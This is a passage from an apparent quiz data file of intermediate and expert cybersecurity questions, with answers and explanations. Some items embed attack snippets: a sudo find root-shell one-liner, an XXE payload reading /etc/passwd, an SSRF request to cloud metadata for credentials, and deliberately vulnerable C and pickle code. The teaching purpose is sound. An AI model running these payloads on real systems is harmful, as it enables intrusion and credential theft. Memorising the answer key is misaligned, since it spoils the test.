    hint: "Fast hashes like MD5/SHA-256 can be calculated billions of times per second on GPUs. Slow hashes introduce configurable work factors.",
    explanation: "A unique salt ensures identical passwords yield different hashes, defeating precomputed rainbow tables. Adaptive work factors (bcrypt/Argon2) intentionally consume CPU/memory, making mass brute-force attacks infeasible.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["crypto", "passwords", "bcrypt"]
  },
  {
    id: "cyber-int-007",
    language: "cyber",
    difficulty: "intermediate",
    type: "multiple_choice",
    topic: "pki",
    subtopic: "digital_certificates",
    standardVersion: "X.509 Standard",
    prompt: "In X.509 Public Key Infrastructure, who signs a web server's TLS certificate to establish trust?",
    code: "// HTTPS Handshake Certificate Chain\n[Root CA] -> [Intermediate CA] -> [example.com Certificate]",
    options: [
      "A trusted Certificate Authority (CA) signs the certificate using its own private key",
      "The client browser signs the certificate using symmetric AES",
      "The web server signs its own certificate using the client's public key",
      "The Internet Corporation for Assigned Names and Numbers (ICANN) directly encrypts the DNS record"
    ],
    correctAnswer: "A trusted Certificate Authority (CA) signs the certificate using its own private key",
    acceptedAnswers: ["A trusted Certificate Authority (CA) signs the certificate using its own private key"],
    hint: "The Certificate Authority (CA) validates ownership and signs the certificate using its private key, which browsers verify using built-in CA public keys.",
    explanation: "A trusted Certificate Authority (CA) hashes the certificate details and encrypts that hash using its private key (creating a digital signature). Browsers verify this signature using built-in pre-installed CA public keys.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["pki", "tls", "certificates"]
  },
  {
    id: "cyber-int-008",
    language: "cyber",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "bash_scripting",
    subtopic: "quoting_expansion",
    standardVersion: "POSIX Shell",
    prompt: "What is the exact stdout printed after executing this snippet with variable word splitting?",
    code: "file='secret data.txt'\nrm_mock() { echo \"$# arguments\"; }\nrm_mock $file\nrm_mock \"$file\"",
    options: ["2 arguments\\n1 arguments", "1 arguments\\n1 arguments", "2 arguments\\n2 arguments", "secret data.txt\\nsecret data.txt"],
    correctAnswer: "2 arguments\\n1 arguments",
    acceptedAnswers: ["2 arguments\\n1 arguments"],
    hint: "Unquoted `$file` splits on whitespace into two arguments: 'secret' and 'data.txt'. Quoted `\"$file\"` stays one argument.",
    explanation: "Unquoted `$file` undergoes word splitting, passing two arguments ('secret', 'data.txt') to `rm_mock` so `$#` is 2. Quoted `\"$file\"` preserves spaces as a single argument so `$#` is 1.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["bash", "quoting", "scripting"]
  },
  {
    id: "cyber-int-009",
    language: "cyber",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "bash_scripting",
    subtopic: "test_brackets",
    standardVersion: "Bash 4+",
    prompt: "What is printed by this string comparison using bash double brackets `[[ ... ]]`?",
    code: "str='SyntaxArena_2026'\nif [[ $str == *Arena* ]]; then\n  echo 'MATCH'\nelse\n  echo 'NO'\nfi",
    options: ["MATCH", "NO", "syntax error in condition", "SyntaxArena_2026"],
    correctAnswer: "MATCH",
    acceptedAnswers: ["MATCH"],
    hint: "In Bash `[[ ... ]]`, the `==` operator performs pattern globbing unless quotes are used.",
    explanation: "Inside Bash double brackets `[[ ... ]]`, unquoted RHS strings act as glob patterns. `*Arena*` matches any string containing 'Arena', evaluating to true and printing 'MATCH'.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["bash", "pattern_matching"]
  },
  {
    id: "cyber-int-010",
    language: "cyber",
    difficulty: "intermediate",
    type: "multiple_choice",
    topic: "networking",
    subtopic: "nmap_syn_scan",
    standardVersion: "Network Scanning",
    prompt: "Why is an Nmap SYN stealth scan (`nmap -sS`) called 'half-open' scanning?",
    code: "$ nmap -sS -p 80 192.168.1.100\nClient -> SYN\nServer -> SYN-ACK\nClient -> RST",
    options: [
      "The client sends RST immediately after receiving SYN-ACK, never completing the full 3-way handshake",
      "The scan only checks UDP ports and ignores TCP ports",
      "Only the first 16 bits of the IPv4 packet are inspected",
      "The firewall automatically halts the connection after 50% of packets arrive"
    ],
    correctAnswer: "The client sends RST immediately after receiving SYN-ACK, never completing the full 3-way handshake",
    acceptedAnswers: ["The client sends RST immediately after receiving SYN-ACK, never completing the full 3-way handshake"],
    hint: "Because a full TCP connection is never established, older application layer firewalls did not log the connection.",
    explanation: "In a SYN scan (`-sS`), the client sends a SYN and listens for a response. If SYN-ACK arrives, the port is open, and the client immediately sends a RST (reset) teardown packet instead of completing the handshake with an ACK.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["nmap", "networking", "recon"]
  },
  {
    id: "cyber-int-011",
    language: "cyber",
    difficulty: "intermediate",
    type: "multiple_choice",
    topic: "networking",
    subtopic: "arp_poisoning",
    standardVersion: "RFC 826",
    prompt: "What fundamental vulnerability in the Address Resolution Protocol (ARP) allows ARP Poisoning / Spoofing on a LAN?",
    code: "// ARP Packet: IP 192.168.1.1 is at [Attacker MAC]\nAttacker sends unsolicited ARP replies to Gateway and Victim",
    options: [
      "ARP is stateless and does not authenticate replies; hosts accept unsolicited ARP responses to update their local ARP cache",
      "ARP packets are encrypted using a weak XOR cipher",
      "ARP operates at Layer 7 and can be manipulated by browser cookies",
      "ARP requires IP addresses to be listed in /etc/hosts"
    ],
    correctAnswer: "ARP is stateless and does not authenticate replies; hosts accept unsolicited ARP responses to update their local ARP cache",
    acceptedAnswers: ["ARP is stateless and does not authenticate replies; hosts accept unsolicited ARP responses to update their local ARP cache"],
    hint: "Hosts update their IP-to-MAC translation cache even when they never sent an ARP query (gratuitous ARP).",
    explanation: "ARP lacks any cryptographic authentication. Any device on a local broadcast domain can send forged ARP replies associating the gateway's IP address with the attacker's MAC address, routing all LAN traffic through the attacker.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["networking", "arp", "mitm"]
  },
  {
    id: "cyber-int-012",
    language: "cyber",
    difficulty: "intermediate",
    type: "multiple_choice",
    topic: "web_security",
    subtopic: "same_origin_policy",
    standardVersion: "W3C Standards",
    prompt: "Under the browser Same-Origin Policy (SOP), which components must match exactly for two URLs to share the same origin?",
    code: "URL 1: https://api.syntaxarena.com:443/data\nURL 2: http://api.syntaxarena.com:443/data",
    options: [
      "Protocol (Scheme), Host (Domain), and Port",
      "Host and Path only",
      "Protocol and Top-Level Domain (TLD) only",
      "User-Agent and Session Cookie"
    ],
    correctAnswer: "Protocol (Scheme), Host (Domain), and Port",
    acceptedAnswers: ["Protocol (Scheme), Host (Domain), and Port"],
    hint: "Notice URL 1 uses https:// and URL 2 uses http://. Since the protocol differs, they are different origins.",
    explanation: "The Same-Origin Policy defines an origin as the combination of URI scheme (protocol), host (domain), and port number. If any one of these three elements differs, the origins are distinct and restricted.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["web_security", "sop", "cors"]
  },
  {
    id: "cyber-int-013",
    language: "cyber",
    difficulty: "intermediate",
    type: "multiple_choice",
    topic: "web_security",
    subtopic: "cookie_flags",
    standardVersion: "RFC 6265",
    prompt: "What protection is provided by marking a session cookie with the `HttpOnly` flag?",
    code: "Set-Cookie: session_id=abc123xyz; Secure; HttpOnly; SameSite=Strict",
    options: [
      "Client-side scripts (e.g. `document.cookie`) cannot read the cookie, mitigating credential theft via XSS",
      "The cookie is encrypted on the client hard drive",
      "The cookie can only be sent during HTTP POST requests",
      "The web server automatically deletes the cookie after 60 seconds"
    ],
    correctAnswer: "Client-side scripts (e.g. `document.cookie`) cannot read the cookie, mitigating credential theft via XSS",
    acceptedAnswers: ["Client-side scripts (e.g. `document.cookie`) cannot read the cookie, mitigating credential theft via XSS"],
    hint: "HttpOnly prevents JavaScript access via `document.cookie`.",
    explanation: "The `HttpOnly` flag directs browser engines to prevent client-side JavaScript APIs (like `document.cookie`) from accessing the cookie, preventing attackers from exfiltrating session tokens if an XSS flaw exists.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["web_security", "cookies", "httponly"]
  },
  {
    id: "cyber-int-014",
    language: "cyber",
    difficulty: "intermediate",
    type: "multiple_choice",
    topic: "web_security",
    subtopic: "jwt_structure",
    standardVersion: "RFC 7519",
    prompt: "What are the three dot-separated components of a JSON Web Token (JWT)?",
    code: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
    options: [
      "Header, Payload, and Signature",
      "Algorithm, UserID, and Salt",
      "Public Key, Private Key, and IV",
      "Metadata, Body, and Checksum"
    ],
    correctAnswer: "Header, Payload, and Signature",
    acceptedAnswers: ["Header, Payload, and Signature"],
    hint: "Part 1 declares metadata/algorithm, Part 2 contains claims, and Part 3 verifies integrity.",
    explanation: "A JWT consists of three Base64URL-encoded parts separated by periods: Header (algorithm & token type), Payload (claims/data), and Signature (verifies integrity and authenticates issuer).",
    points: 200,
    estimatedSeconds: 30,
    tags: ["jwt", "auth", "tokens"]
  },
  {
    id: "cyber-int-015",
    language: "cyber",
    difficulty: "intermediate",
    type: "multiple_choice",
    topic: "linux_security",
    subtopic: "linux_capabilities",
    standardVersion: "Linux Kernel 2.2+",
    prompt: "Why are Linux Capabilities (`setcap`) preferred over granting traditional SUID-root permissions to binary executables?",
    code: "# setcap cap_net_bind_service=+ep /usr/local/bin/custom_server",
    options: [
      "Capabilities follow the principle of least privilege by granting only specific kernel powers (e.g. binding to ports < 1024) without full root access",
      "Capabilities automatically sandbox the binary in a virtual machine",
      "Capabilities compile the binary into machine code that cannot crash",
      "Capabilities allow unprivileged users to edit /etc/sudoers directly"
    ],
    correctAnswer: "Capabilities follow the principle of least privilege by granting only specific kernel powers (e.g. binding to ports < 1024) without full root access",
    acceptedAnswers: ["Capabilities follow the principle of least privilege by granting only specific kernel powers (e.g. binding to ports < 1024) without full root access"],
    hint: "Instead of all-or-nothing root, capabilities break down root powers into individual granular privileges.",
    explanation: "Traditional SUID gives an executable ALL root powers. Linux Capabilities subdivide root privileges into distinct units (e.g. `CAP_NET_BIND_SERVICE` allows binding port 80 without granting root file or process permissions).",
    points: 200,
    estimatedSeconds: 30,
    tags: ["linux", "capabilities", "privilege_escalation"]
  },
  {
    id: "cyber-int-016",
    language: "cyber",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "linux_administration",
    subtopic: "umask_calculation",
    standardVersion: "POSIX Standards",
    prompt: "What default permissions will a newly created regular file have if the user's `umask` is `027`?",
    code: "$ umask 027\n$ touch testfile.txt\n$ ls -l testfile.txt | awk '{print $1}'",
    options: ["-rw-r-----", "-rw-rw-r--", "-rwxr-x---", "-rw-r--r--"],
    correctAnswer: "-rw-r-----",
    acceptedAnswers: ["-rw-r-----"],
    hint: "Standard base file permission is 666 (rw-rw-rw-). Subtract 027: 666 - 027 = 640.",
    explanation: "Default base permission for files is 666 (`rw-rw-rw-`). Applying umask 027 masks out group write (2) and all others permissions (7), leaving 640 (`-rw-r-----`).",
    points: 200,
    estimatedSeconds: 30,
    tags: ["linux", "umask", "permissions"]
  },
  {
    id: "cyber-int-017",
    language: "cyber",
    difficulty: "intermediate",
    type: "multiple_choice",
    topic: "linux_security",
    subtopic: "sudoers_misconfiguration",
    standardVersion: "Sudo Project",
    prompt: "If `/etc/sudoers` grants `player ALL=(ALL) NOPASSWD: /usr/bin/find`, how can `player` escalate privileges to an interactive root shell?",
    code: "$ sudo find . -exec /bin/sh \\; -quit",
    options: [
      "Run `sudo find . -exec /bin/sh \\; -quit` to spawn a root shell directly through find's execution flag",
      "Edit /etc/shadow using the find text editor mode",
      "Wait for the find process to timeout and drop into recovery console",
      "Pipe find output into chmod 777 /etc/passwd"
    ],
    correctAnswer: "Run `sudo find . -exec /bin/sh \\; -quit` to spawn a root shell directly through find's execution flag",
    acceptedAnswers: ["Run `sudo find . -exec /bin/sh \\; -quit` to spawn a root shell directly through find's execution flag"],
    hint: "The `-exec` flag in `find` executes an arbitrary binary with the privileges of the executing process (root).",
    explanation: "Because `find` includes the `-exec` flag, running it with sudo allows executing `/bin/sh`. The spawned shell inherits the parent process's EUID (root), granting immediate root access (GTFOBins pattern).",
    points: 200,
    estimatedSeconds: 30,
    tags: ["linux", "privilege_escalation", "gtfobins"]
  },
  {
    id: "cyber-int-018",
    language: "cyber",
    difficulty: "intermediate",
    type: "multiple_choice",
    topic: "networking",
    subtopic: "ssh_host_keys",
    standardVersion: "RFC 4251",
    prompt: "What security risk does OpenSSH warn against when displaying: `WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!`?",
    code: "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\nIT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!",
    options: [
      "A potential Man-in-the-Middle (MITM) attack where an attacker is intercepting connection traffic with a spoofed host key",
      "The remote server has run out of physical disk space",
      "The client's SSH private key has expired according to NTP clocks",
      "The remote server upgraded from IPv4 to IPv6"
    ],
    correctAnswer: "A potential Man-in-the-Middle (MITM) attack where an attacker is intercepting connection traffic with a spoofed host key",
    acceptedAnswers: ["A potential Man-in-the-Middle (MITM) attack where an attacker is intercepting connection traffic with a spoofed host key"],
    hint: "The stored fingerprint in `~/.ssh/known_hosts` does not match the public key presented by the remote server.",
    explanation: "OpenSSH checks the server's public key against known host fingerprints in `~/.ssh/known_hosts`. A mismatch means the server was re-keyed OR an attacker is staging a Man-in-the-Middle attack.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["ssh", "mitm", "networking"]
  },
  {
    id: "cyber-int-019",
    language: "cyber",
    difficulty: "intermediate",
    type: "multiple_choice",
    topic: "cryptography",
    subtopic: "diffie_hellman",
    standardVersion: "RFC 2631",
    prompt: "What is the key cryptographic breakthrough provided by the Diffie-Hellman Key Exchange?",
    code: "// Diffie-Hellman Exchange\nAlice & Bob agree on shared secret over an insecure channel without transmitting the secret itself",
    options: [
      "Two parties can establish a shared symmetric secret over an untrusted channel without ever transmitting the secret key",
      "It allows decrypting SHA-256 hashes without brute-force computation",
      "It mathematically proves a program contains zero memory safety bugs",
      "It converts asymmetric RSA keys into symmetric AES keys"
    ],
    correctAnswer: "Two parties can establish a shared symmetric secret over an untrusted channel without ever transmitting the secret key",
    acceptedAnswers: ["Two parties can establish a shared symmetric secret over an untrusted channel without ever transmitting the secret key"],
    hint: "Diffie-Hellman uses discrete logarithm math so an eavesdropper seeing public values cannot compute the shared secret.",
    explanation: "Diffie-Hellman enables two parties with no prior communication to compute a mutual shared secret over an insecure eavesdropped channel using modular exponentiation and the discrete logarithm problem.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["crypto", "diffie_hellman", "key_exchange"]
  },
  {
    id: "cyber-int-020",
    language: "cyber",
    difficulty: "intermediate",
    type: "multiple_choice",
    topic: "security_vulnerabilities",
    subtopic: "redos",
    standardVersion: "CWE-1333",
    prompt: "Why is the regular expression `^([a-zA-Z0-9]+)+$` vulnerable to Regular Expression Denial of Service (ReDoS)?",
    code: "// Catastrophic Backtracking\nconst regex = /^([a-zA-Z0-9]+)+$/;\nregex.test('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!');",
    options: [
      "Nested quantifiers cause exponential catastrophic backtracking when an input string fails to match at the end",
      "The regex engine leaks memory allocations to the operating system swap file",
      "The plus operator executes subshell commands in PCRE engines",
      "It triggers a stack buffer overflow in the JavaScript V8 parser"
    ],
    correctAnswer: "Nested quantifiers cause exponential catastrophic backtracking when an input string fails to match at the end",
    acceptedAnswers: ["Nested quantifiers cause exponential catastrophic backtracking when an input string fails to match at the end"],
    hint: "When nested `+` quantifiers fail on the trailing character, the engine tries all $2^N$ combinations of grouping.",
    explanation: "Nested quantifiers like `(a+)+` lead to catastrophic backtracking on Non-deterministic Finite Automata (NFA) engines. When an input with $N$ characters fails to match, the engine explores $O(2^N)$ path combinations, locking the CPU thread.",
    points: 200,
    estimatedSeconds: 30,
    tags: ["redos", "regex", "dos"]
  },

  // =========================================================================
  // CYBER EXPERT (20 QUESTIONS: cyber-exp-001 to cyber-exp-020)
  // =========================================================================
  {
    id: "cyber-exp-001",
    language: "cyber",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "binary_exploitation",
    subtopic: "stack_buffer_overflow",
    standardVersion: "x86_64 ABI",
    prompt: "In classic x86/x86_64 stack-based buffer overflows, what specific data on the stack does the attacker target to redirect control flow?",
    code: "void vulnerable_func(char *str) {\n    char buffer[64];\n    strcpy(buffer, str); // Unchecked copy\n}",
    options: [
      "The Saved Return Address (Saved RIP / EIP) stored on the stack frame",
      "The CPU L1 instruction cache line tag",
      "The kernel process descriptor pointer in /proc",
      "The Global Offset Table (GOT) base address"
    ],
    correctAnswer: "The Saved Return Address (Saved RIP / EIP) stored on the stack frame",
    acceptedAnswers: ["The Saved Return Address (Saved RIP / EIP) stored on the stack frame"],
    hint: "When a function returns, the CPU pops the saved return address from the stack into the Instruction Pointer (RIP/EIP).",
    explanation: "The call instruction pushes the return address onto the stack. An unchecked `strcpy` writing past the local buffer bounds overwrites the saved frame pointer (RBP) and the saved return address (RIP). When `ret` executes, the CPU jumps to the attacker's address.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["binary_exploitation", "buffer_overflow", "stack"]
  },
  {
    id: "cyber-exp-002",
    language: "cyber",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "binary_exploitation",
    subtopic: "stack_canaries",
    standardVersion: "GCC / Clang Security",
    prompt: "How does a compiler Stack Canary (Stack Protector) detect stack buffer overflows before function return?",
    code: "// Disassembly with -fstack-protector-all\nmov rax, fs:0x28        // Load random canary from TLS\nmov [rbp-0x8], rax      // Place on stack\n...\nxor rax, [rbp-0x8]      // Check before return\njnz __stack_chk_fail    // Abort if corrupted",
    options: [
      "A random value placed between local variables and the return address is verified before returning; any alteration aborts execution",
      "It encrypts the function arguments using hardware AES-NI instructions",
      "It locks stack memory pages to read-only status while the function executes",
      "It replaces function pointers with dynamic hash tables in the BSS segment"
    ],
    correctAnswer: "A random value placed between local variables and the return address is verified before returning; any alteration aborts execution",
    acceptedAnswers: ["A random value placed between local variables and the return address is verified before returning; any alteration aborts execution"],
    hint: "If an overflow overwrites the return address, it must also overwrite the canary positioned right before it.",
    explanation: "A stack canary places a secret random value between local stack variables and the saved return address. Before returning, the function compares the stack value against the thread storage. If corrupted, `__stack_chk_fail` terminates the process immediately.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["canary", "mitigation", "binary_security"]
  },
  {
    id: "cyber-exp-003",
    language: "cyber",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "binary_exploitation",
    subtopic: "aslr_dep",
    standardVersion: "OS Kernel Security",
    prompt: "What is the combined defense mechanism provided by Address Space Layout Randomization (ASLR) and Data Execution Prevention (DEP / NX)?",
    code: "// Modern Exploit Mitigations\nNX/DEP: Memory cannot be both Writable and Executable (W^X)\nASLR: Memory segment base addresses randomized on execution",
    options: [
      "DEP makes stack/heap non-executable (stopping direct shellcode execution), while ASLR randomizes memory addresses (stopping hardcoded jump targets)",
      "DEP encrypts network packets while ASLR generates SSL certificates",
      "DEP prevents SQL injection while ASLR prevents XSS attacks",
      "DEP verifies cryptographic digital signatures on kernel drivers"
    ],
    correctAnswer: "DEP makes stack/heap non-executable (stopping direct shellcode execution), while ASLR randomizes memory addresses (stopping hardcoded jump targets)",
    acceptedAnswers: ["DEP makes stack/heap non-executable (stopping direct shellcode execution), while ASLR randomizes memory addresses (stopping hardcoded jump targets)"],
    hint: "DEP enforces W^X (Write XOR Execute). ASLR makes gadget and function addresses unpredictable.",
    explanation: "DEP/NX marks memory pages (stack/heap) non-executable so injected shellcode cannot run directly. ASLR randomizes the base addresses of stack, heap, and shared libraries so attackers cannot reliably jump to fixed addresses.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["aslr", "dep", "exploit_mitigation"]
  },
  {
    id: "cyber-exp-004",
    language: "cyber",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "binary_exploitation",
    subtopic: "rop_chains",
    standardVersion: "Exploit Techniques",
    prompt: "How does Return-Oriented Programming (ROP) bypass Data Execution Prevention (DEP / NX)?",
    code: "// ROP Gadgets in libc:\n0x401150: pop rdi ; ret\n0x401152: <address_of_bin_sh>\n0x401160: <address_of_system>",
    options: [
      "It chains existing small snippets of executable code ending in `ret` (gadgets) already residing in executable memory segments",
      "It injects machine code into kernel memory via /dev/kmem",
      "It modifies the CPU instruction decoder to ignore the NX page table bit",
      "It overwrites the BIOS flash ROM with custom firmware"
    ],
    correctAnswer: "It chains existing small snippets of executable code ending in `ret` (gadgets) already residing in executable memory segments",
    acceptedAnswers: ["It chains existing small snippets of executable code ending in `ret` (gadgets) already residing in executable memory segments"],
    hint: "Because code in `.text` and shared libraries (`libc`) is already marked executable, chaining existing code snippets bypasses DEP.",
    explanation: "ROP bypasses DEP by stitching together existing short instruction sequences ('gadgets') already residing in executable memory segments (like libc or binary code) ending in a `ret` instruction, setting up registers and calling functions like `system('/bin/sh')`.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["rop", "dep_bypass", "binary_exploitation"]
  },
  {
    id: "cyber-exp-005",
    language: "cyber",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "binary_exploitation",
    subtopic: "format_string",
    standardVersion: "CWE-134",
    prompt: "Why is calling `printf(user_input)` without a format specifier string vulnerable to arbitrary memory reads and writes?",
    code: "char user_input[256];\nfgets(user_input, sizeof(user_input), stdin);\nprintf(user_input); // VULNERABILITY!",
    options: [
      "Format specifiers like `%x` read stack data, and `%n` writes the number of printed bytes to a pointer on the stack",
      "It causes the printf library to execute shellcode directly",
      "It compiles user_input into an executable bash script",
      "It disables the operating system virtual memory paging table"
    ],
    correctAnswer: "Format specifiers like `%x` read stack data, and `%n` writes the number of printed bytes to a pointer on the stack",
    acceptedAnswers: ["Format specifiers like `%x` read stack data, and `%n` writes the number of printed bytes to a pointer on the stack"],
    hint: "The `%n` format specifier in C writes the count of characters printed so far to a target memory address.",
    explanation: "When `printf` parses format specifiers with no corresponding arguments, it reads values from the stack/registers (e.g. `%p`, `%s` leaks data). The `%n` specifier writes the count of printed characters to the target address, enabling arbitrary memory modification.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["format_string", "cwe-134", "memory_safety"]
  },
  {
    id: "cyber-exp-006",
    language: "cyber",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "binary_exploitation",
    subtopic: "use_after_free",
    standardVersion: "CWE-416",
    prompt: "What sequence of events defines a Use-After-Free (UAF) vulnerability?",
    code: "struct User *u = malloc(sizeof(struct User));\nfree(u); // Pointer u is not set to NULL\n// ... other allocations occur ...\nu->login_fn(); // Calling through dangling pointer!",
    options: [
      "Memory is deallocated via `free()`, but the dangling pointer is subsequently dereferenced after the memory was reallocated for other attacker-controlled data",
      "A thread writes to a mutex without acquiring it first",
      "Memory is allocated via malloc but never freed, exhausting heap RAM",
      "An uninitialized stack pointer points to kernel address space"
    ],
    correctAnswer: "Memory is deallocated via `free()`, but the dangling pointer is subsequently dereferenced after the memory was reallocated for other attacker-controlled data",
    acceptedAnswers: ["Memory is deallocated via `free()`, but the dangling pointer is subsequently dereferenced after the memory was reallocated for other attacker-controlled data"],
    hint: "A dangling pointer dereferences heap memory that has been reclaimed and potentially filled with attacker-controlled data.",
    explanation: "When memory is freed without zeroing the pointer, the pointer becomes dangling. If an attacker can spray the heap so the newly reallocated chunk occupies that same address, invoking function pointers or methods through the dangling pointer executes attacker code.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["uaf", "heap", "cwe-416"]
  },
  {
    id: "cyber-exp-007",
    language: "cyber",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "web_security",
    subtopic: "ssrf_cloud_metadata",
    standardVersion: "CWE-918",
    prompt: "What is the primary target of Server-Side Request Forgery (SSRF) attacks on modern AWS / cloud environments?",
    code: "// Vulnerable fetcher\n$url = $_GET['webhook_url'];\nfile_get_contents($url); // Attacker passes: http://169.254.169.254/latest/meta-data/iam/...",
    options: [
      "The Instance Metadata Service (IMDS at 169.254.169.254) to steal temporary IAM role credentials and security keys",
      "The local GPU shader cache to steal bitcoin wallets",
      "The client browser's local localStorage cache",
      "The router's optical fiber physical transceiver"
    ],
    correctAnswer: "The Instance Metadata Service (IMDS at 169.254.169.254) to steal temporary IAM role credentials and security keys",
    acceptedAnswers: ["The Instance Metadata Service (IMDS at 169.254.169.254) to steal temporary IAM role credentials and security keys"],
    hint: "The link-local IP `169.254.169.254` provides VM instance metadata and IAM role credentials in AWS/GCP/Azure.",
    explanation: "SSRF allows an external attacker to force the backend server to make HTTP requests into the internal network. In cloud environments, querying link-local address `169.254.169.254` dumps temporary IAM role credentials, enabling total cloud account takeover.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["ssrf", "cloud", "aws_security"]
  },
  {
    id: "cyber-exp-008",
    language: "cyber",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "web_security",
    subtopic: "xxe_injection",
    standardVersion: "CWE-611",
    prompt: "How does XML External Entity (XXE) injection extract sensitive files like `/etc/passwd`?",
    code: "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<user><name>&xxe;</name></user>",
    options: [
      "The XML parser resolves external entity definitions using the `SYSTEM` identifier, reading and embedding local file contents into the document",
      "The XML tags overwrite the web server binary executable on disk",
      "The parser establishes a direct SSH tunnel to the client machine",
      "It injects SQL commands directly into the database driver via XML comments"
    ],
    correctAnswer: "The XML parser resolves external entity definitions using the `SYSTEM` identifier, reading and embedding local file contents into the document",
    acceptedAnswers: ["The XML parser resolves external entity definitions using the `SYSTEM` identifier, reading and embedding local file contents into the document"],
    hint: "Notice `<!ENTITY xxe SYSTEM \"file:///etc/passwd\">` defines an entity pointing to a local file URI.",
    explanation: "If an XML parser has external entity resolution enabled, an attacker can define an external entity pointing to a local URI (`file:///etc/passwd`). When the parser expands `&xxe;`, it reads the local file and reflects its contents in the server response.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["xxe", "xml", "cwe-611"]
  },
  {
    id: "cyber-exp-009",
    language: "cyber",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "web_security",
    subtopic: "deserialization",
    standardVersion: "CWE-502",
    prompt: "Why is Python's `pickle.loads()` fundamentally unsafe when handling untrusted user input?",
    code: "import pickle\nuser_data = request.get_data()\nobj = pickle.loads(user_data) // CRITICAL VULNERABILITY!",
    options: [
      "The pickle protocol supports the `__reduce__` method, which can specify an arbitrary callable (like `os.system`) and arguments executed upon deserialization",
      "Pickle files automatically disable system firewall rules upon loading",
      "Pickle creates unencrypted temporary files in /var/tmp",
      "Pickle only works with Python 2 syntax"
    ],
    correctAnswer: "The pickle protocol supports the `__reduce__` method, which can specify an arbitrary callable (like `os.system`) and arguments executed upon deserialization",
    acceptedAnswers: ["The pickle protocol supports the `__reduce__` method, which can specify an arbitrary callable (like `os.system`) and arguments executed upon deserialization"],
    hint: "Objects defining `__reduce__()` tell the unpickler what callable function to invoke to reconstruct the object.",
    explanation: "Python's `pickle` is not a secure data serialization format. When reconstructing an object, `pickle` executes the function returned by the object's `__reduce__` method. Attackers can craft payloads specifying `os.system('/bin/sh')`, achieving remote code execution.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["deserialization", "cwe-502", "rce"]
  },
  {
    id: "cyber-exp-010",
    language: "cyber",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "web_security",
    subtopic: "dns_rebinding",
    standardVersion: "CWE-346",
    prompt: "How does a DNS Rebinding attack circumvent browser Same-Origin Policy (SOP) to interact with internal services (e.g. 127.0.0.1)?",
    code: "Lookup 1: attacker.com -> 198.51.100.1 (TTL=0)\nLookup 2: attacker.com -> 127.0.0.1 (Internal target)",
    options: [
      "The attacker configures a DNS server with TTL=0 to resolve first to an external server delivering JavaScript, then to 127.0.0.1 so subsequent requests hit local services while sharing the same origin",
      "The attacker modifies the victim's /etc/resolv.conf file via web cookies",
      "The DNS query overloads the router NAT table with broadcast packets",
      "The browser disables HTTPS validation when the domain name contains hyphen characters"
    ],
    correctAnswer: "The attacker configures a DNS server with TTL=0 to resolve first to an external server delivering JavaScript, then to 127.0.0.1 so subsequent requests hit local services while sharing the same origin",
    acceptedAnswers: ["The attacker configures a DNS server with TTL=0 to resolve first to an external server delivering JavaScript, then to 127.0.0.1 so subsequent requests hit local services while sharing the same origin"],
    hint: "Because the domain name remains `attacker.com`, the browser believes all requests are same-origin even when the IP switches to localhost.",
    explanation: "By serving a domain with TTL=0, the attacker's DNS server answers first with the attacker's IP (serving malicious JS). On the next request, DNS resolves to `127.0.0.1`. The browser considers it same-origin (`attacker.com`), allowing JS to read responses from local services.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["dns_rebinding", "sop", "network_security"]
  },
  {
    id: "cyber-exp-011",
    language: "cyber",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "cryptography",
    subtopic: "tls13_pfs",
    standardVersion: "RFC 8446 (TLS 1.3)",
    prompt: "Why did TLS 1.3 completely remove static RSA key exchange in favor of ephemeral Diffie-Hellman (ECDHE)?",
    code: "// TLS 1.3 Cipher Suites:\nTLS_AES_128_GCM_SHA256\nTLS_AES_256_GCM_SHA384\nTLS_CHACHA20_POLY1305_SHA256",
    options: [
      "To enforce Perfect Forward Secrecy (PFS), guaranteeing past recorded session traffic cannot be decrypted even if the server's private key is compromised later",
      "Because RSA keys are limited to 512 bits in modern web standards",
      "Because ECDHE eliminates the need for X.509 certificates",
      "To allow connections over UDP without any handshake"
    ],
